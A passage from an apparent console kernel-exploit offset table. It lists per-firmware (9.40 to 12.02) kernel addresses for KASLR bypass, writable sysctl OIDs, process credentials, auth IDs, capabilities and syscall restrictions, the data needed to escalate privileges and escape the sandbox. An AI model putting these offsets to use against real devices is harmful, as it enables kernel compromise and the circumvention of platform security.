                        arg1Value: 0x3bf8f3c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3bf8f38,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a588e8,
                rodataProbe: {
                    rva: 0x11077cf,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "9.40": {
                firmware: "9.40",
                security_flags: 0x1a13064,
                kernelData: 0xca0000,
                allproc: 0x33f5d50,
                rootvnode: 0x3c7b510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xac19e1,
                    retLow16: 0x19e1,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x2787ab8,
                        kind: 0x2787acc,
                        kindByte3: 0x2787acf,
                        arg1: 0x2787ad0,
                        arg1Byte1: 0x2787ad1,
                        arg1Value: 0x2787aa8,
                        deadSink: 0x2787ad8,
                    },
                    b: {
                        base: 0x2787990,
                        kind: 0x27879a4,
                        kindByte3: 0x27879a7,
                        arg1: 0x27879a8,
                        arg1Value: 0x27878c0,
                        visible: 0x27879e0,
                    },
                    c: {
                        base: 0x2aaa678,
                        kind: 0x2aaa68c,
                        arg1: 0x2aaa690,
                        arg1Value: 0x3bf8f3c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3bf8f38,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a588e8,
                rodataProbe: {
                    rva: 0x110790f,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "9.60": {
                firmware: "9.60",
                security_flags: 0x1a13064,
                kernelData: 0xca0000,
                allproc: 0x33f5d50,
                rootvnode: 0x3c7b510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xac1bc1,
                    retLow16: 0x1bc1,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x2787ab8,
                        kind: 0x2787acc,
                        kindByte3: 0x2787acf,
                        arg1: 0x2787ad0,
                        arg1Byte1: 0x2787ad1,
                        arg1Value: 0x2787aa8,
                        deadSink: 0x2787ad8,
                    },
                    b: {
                        base: 0x2787990,
                        kind: 0x27879a4,
                        kindByte3: 0x27879a7,
                        arg1: 0x27879a8,
                        arg1Value: 0x27878c0,
                        visible: 0x27879e0,
                    },
                    c: {
                        base: 0x2aaa678,
                        kind: 0x2aaa68c,
                        arg1: 0x2aaa690,
                        arg1Value: 0x3bf8f3c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3bf8f38,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a588e8,
                rodataProbe: {
                    rva: 0x1107bfa,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "10.00": {
                firmware: "10.00",
                security_flags: 0x1a39064,
                kernelData: 0xcc0000,
                allproc: 0x3425d70,
                rootvnode: 0x3c63510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xadf87f,
                    retLow16: 0xf87f,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x27a8138,
                        kind: 0x27a814c,
                        kindByte3: 0x27a814f,
                        arg1: 0x27a8150,
                        arg1Byte1: 0x27a8151,
                        arg1Value: 0x27a8128,
                        deadSink: 0x27a8158,
                    },
                    b: {
                        base: 0x27a8010,
                        kind: 0x27a8024,
                        kindByte3: 0x27a8027,
                        arg1: 0x27a8028,
                        arg1Value: 0x27a7f40,
                        visible: 0x27a8060,
                    },
                    c: {
                        base: 0x2acadd8,
                        kind: 0x2acadec,
                        arg1: 0x2acadf0,
                        arg1Value: 0x3be307c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3be3078,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a78978,
                rodataProbe: {
                    rva: 0x112dae5,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc40,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "10.01": {
                firmware: "10.01",
                security_flags: 0x1a39064,
                kernelData: 0xcc0000,
                allproc: 0x3425d70,
                rootvnode: 0x3c63510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xadf87f,
                    retLow16: 0xf87f,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x27a8138,
                        kind: 0x27a814c,
                        kindByte3: 0x27a814f,
                        arg1: 0x27a8150,
                        arg1Byte1: 0x27a8151,
                        arg1Value: 0x27a8128,
                        deadSink: 0x27a8158,
                    },
                    b: {
                        base: 0x27a8010,
                        kind: 0x27a8024,
                        kindByte3: 0x27a8027,
                        arg1: 0x27a8028,
                        arg1Value: 0x27a7f40,
                        visible: 0x27a8060,
                    },
                    c: {
                        base: 0x2acadd8,
                        kind: 0x2acadec,
                        arg1: 0x2acadf0,
                        arg1Value: 0x3be307c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3be3078,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a78978,
                rodataProbe: {
                    rva: 0x112db73,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc40,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "10.20": {
                firmware: "10.20",
                security_flags: 0x1a39064,
                kernelData: 0xcc0000,
                allproc: 0x3425d70,
                rootvnode: 0x3c63510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xadfa9f,
                    retLow16: 0xfa9f,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x27a8138,
                        kind: 0x27a814c,
                        kindByte3: 0x27a814f,
                        arg1: 0x27a8150,
                        arg1Byte1: 0x27a8151,
                        arg1Value: 0x27a8128,
                        deadSink: 0x27a8158,
                    },
                    b: {
                        base: 0x27a8010,
                        kind: 0x27a8024,
                        kindByte3: 0x27a8027,
                        arg1: 0x27a8028,
                        arg1Value: 0x27a7f40,
                        visible: 0x27a8060,
                    },
                    c: {
                        base: 0x2acadd8,
                        kind: 0x2acadec,
                        arg1: 0x2acadf0,
                        arg1Value: 0x3be307c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3be3078,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a78978,
                rodataProbe: {
                    rva: 0x112daf5,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc40,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "10.40": {
                firmware: "10.40",
                security_flags: 0x1a39064,
                kernelData: 0xcc0000,
                allproc: 0x3425d70,
                rootvnode: 0x3c63510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xadfa9f,
                    retLow16: 0xfa9f,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x27a8138,
                        kind: 0x27a814c,
                        kindByte3: 0x27a814f,
                        arg1: 0x27a8150,
                        arg1Byte1: 0x27a8151,
                        arg1Value: 0x27a8128,
                        deadSink: 0x27a8158,
                    },
                    b: {
                        base: 0x27a8010,
                        kind: 0x27a8024,
                        kindByte3: 0x27a8027,
                        arg1: 0x27a8028,
                        arg1Value: 0x27a7f40,
                        visible: 0x27a8060,
                    },
                    c: {
                        base: 0x2acadd8,
                        kind: 0x2acadec,
                        arg1: 0x2acadf0,
                        arg1Value: 0x3be307c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3be3078,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a78978,
                rodataProbe: {
                    rva: 0x112db1f,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc40,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "10.60": {
                firmware: "10.60",
                kernelData: 0xcc0000,
                allproc: 0x3425d70,
                rootvnode: 0x3c63510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xadfa7f,
                    retLow16: 0xfa7f,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x27a8138,
                        kind: 0x27a814c,
                        kindByte3: 0x27a814f,
                        arg1: 0x27a8150,
                        arg1Byte1: 0x27a8151,
                        arg1Value: 0x27a8128,
                        deadSink: 0x27a8158,
                    },
                    b: {
                        base: 0x27a8010,
                        kind: 0x27a8024,
                        kindByte3: 0x27a8027,
                        arg1: 0x27a8028,
                        arg1Value: 0x27a7f40,
                        visible: 0x27a8060,
                    },
                    c: {
                        base: 0x2acadd8,
                        kind: 0x2acadec,
                        arg1: 0x2acadf0,
                        arg1Value: 0x3be307c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3be3078,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a78978,
                rodataProbe: {
                    rva: 0x112d569,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc40,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "11.00": {
                firmware: "11.00",
                security_flags: 0x1abc064,
                kernelData: 0xd30000,
                allproc: 0x35a5d70,
                rootvnode: 0x3de7510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xb52b61,
                    retLow16: 0x2b61,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x2929e58,
                        kind: 0x2929e6c,
                        kindByte3: 0x2929e6f,
                        arg1: 0x2929e70,
                        arg1Byte1: 0x2929e71,
                        arg1Value: 0x2929e48,
                        deadSink: 0x2929e78,
                    },
                    b: {
                        base: 0x2929d30,
                        kind: 0x2929d44,
                        kindByte3: 0x2929d47,
                        arg1: 0x2929d48,
                        arg1Value: 0x2929c60,
                        visible: 0x2929d80,
                    },
                    c: {
                        base: 0x2c4cb18,
                        kind: 0x2c4cb2c,
                        arg1: 0x2c4cb30,
                        arg1Value: 0x3d670bc,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3d670b8,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1af9f18,
                rodataProbe: {
                    rva: 0x11a7aba,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc40,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "11.20": {
                firmware: "11.20",
                security_flags: 0x1abc064,
                kernelData: 0xd30000,
                allproc: 0x35a5d70,
                rootvnode: 0x3de7510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xb52b61,
                    retLow16: 0x2b61,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x2929e58,
                        kind: 0x2929e6c,
                        kindByte3: 0x2929e6f,
                        arg1: 0x2929e70,
                        arg1Byte1: 0x2929e71,
                        arg1Value: 0x2929e48,
                        deadSink: 0x2929e78,
                    },
                    b: {
                        base: 0x2929d30,
                        kind: 0x2929d44,
                        kindByte3: 0x2929d47,
                        arg1: 0x2929d48,
                        arg1Value: 0x2929c60,
                        visible: 0x2929d80,
                    },
                    c: {
                        base: 0x2c4cb18,
                        kind: 0x2c4cb2c,
                        arg1: 0x2c4cb30,
                        arg1Value: 0x3d670bc,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3d670b8,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1af9f18,
                rodataProbe: {
                    rva: 0x11a7625,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc40,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "11.60": {
                firmware: "11.60",
                kernelData: 0xd30000,
                allproc: 0x35a5d70,
                rootvnode: 0x3de7510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xb53301,
                    retLow16: 0x3301,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x2929ed0,
                        kind: 0x2929eec,
                        kindByte3: 0x2929eef,
                        arg1: 0x2929ef0,
                        arg1Byte1: 0x2929ef1,
                        arg1Value: 0x2929ec8,
                        deadSink: 0x2929ef8,
                    },
                    b: {
                        base: 0x2929da8,
                        kind: 0x2929dc4,
                        kindByte3: 0x2929dc7,
                        arg1: 0x2929dc8,
                        arg1Value: 0x2929ce0,
                        visible: 0x2929e00,
                    },
                    c: {
                        base: 0x2c4cb90,
                        kind: 0x2c4cbac,
                        arg1: 0x2c4cbb0,
                        arg1Value: 0x3d670bc,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3d670b8,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x3b77e20,
                rodataProbe: {
                    rva: 0x11a7987,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc40,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "12.00": {
                firmware: "12.00",
                kernelData: 0xd50000,
                allproc: 0x35d5e00,
                rootvnode: 0x3e27510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xb6ec71,
                    retLow16: 0xec71,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x294b408,
                        kind: 0x294b41c,
                        kindByte3: 0x294b41f,
                        arg1: 0x294b420,
                        arg1Byte1: 0x294b421,
                        arg1Value: 0x294b3f8,
                        deadSink: 0x294b428,
                    },
                    b: {
                        base: 0x294b2e0,
                        kind: 0x294b2f4,
                        kindByte3: 0x294b2f7,
                        arg1: 0x294b2f8,
                        arg1Value: 0x294b210,
                        visible: 0x294b330,
                    },
                    c: {
                        base: 0x2c6e108,
                        kind: 0x2c6e11c,
                        arg1: 0x2c6e120,
                        arg1Value: 0x3da32bc,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3da32b8,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1b4dd78,
                rodataProbe: {
                    rva: 0x11c8f51,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc48,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "12.02": {
                firmware: "12.02",
                kernelData: 0xd50000,
                allproc: 0x35d5e00,
                rootvnode: 0x3e27510,
                kaslr: {
                    mode: "rtmsg2",
